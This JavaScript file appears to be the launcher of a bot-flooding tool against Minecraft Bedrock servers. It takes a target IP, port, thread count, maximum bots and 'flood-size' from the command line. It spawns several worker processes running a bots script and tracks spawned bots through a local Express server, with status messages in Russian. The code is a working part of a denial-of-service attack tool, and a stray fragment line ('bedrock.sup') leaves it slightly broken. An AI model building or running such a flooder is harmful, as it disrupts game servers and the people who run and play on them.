const { spawn } = require('child_process');
const bedrock = require('bedrock-protocol');
bedrock.sup
let settings = { express_port: 62363, args: process.argv.slice(2), minecraft: {} }, bots = { connected: 0, valid: 0, spawned: 0 }, app = (require('express'))(), versions = ['1.21.42', '1.21.30', '1.21.2', '1.21.0', '1.20.80', '1.20.71', '1.20.61', '1.20.50', '1.20.40', '1.20.30', '1.20.10', '1.20.0', '1.19.80', '1.19.70', '1.19.63', '1.19.62', '1.19.60', '1.19.51', '1.19.50', '1.19.41', '1.19.40', '1.19.31', '1.19.30', '1.19.22', '1.19.21', '1.19.20', '1.19.11', '1.19.10', '1.19.2', '1.19.1', '1.18.31', '1.18.30', '1.18.12', '1.18.11', '1.18.10', '1.18.2', '1.18.1', '1.18.0', '1.17.41', '1.17.40', '1.17.34', '1.17.30', '1.17.11', '1.17.10', '1.17.0', '1.16.220', '1.16.210', '1.16.201'];

const main = (async () => {
    settings.minecraft = {
        version: settings.args[0],
        ip: settings.args[1],
        port: Number(settings.args[2]),
        threads: Number(settings.args[3]),
        'max-bots': Number(settings.args[4]),
        'max-ram': Number(settings.args[5]),
        'flood-size': Number(settings.args[6]),
        'bot-name': settings.args[7]
    };

    app.use((require('body-parser')).json());

    app.post('/send', req => req.body.type == '+' ? bots[req.body.arg]++ : bots[req.body.arg]--);

    app.get('/get-data', (_, res) => res.json(settings));

    app.get('/get-bots', (_, res) => res.json(bots));

    app.listen(settings.express_port, async () => typeof settings.args[8] === 'undefined' && await threader());

    const threader = (async () => Array.from({ length: settings.minecraft.threads }, (_, i) => {
        const thread = spawn('node', ['--stack-size=65500', 'bots.js']);
        thread.once('spawn', () => console.log(`[${i + 1}] Поток загружен`));
    }));

    setInterval(() => process.title = `Память: ${(process.memoryUsage().rss / 1024 / 1024).toFixed(2)} мб | Сейчас ${bots.spawned} ботов заспавнилось из ${bots.valid} подключенных`, 100)
});

(async () => (settings.args[0].startsWith('#') || versions.includes(settings.args[0]) ? await main() : console.log(`Доступные версии: ${versions.join(', ')}`)))();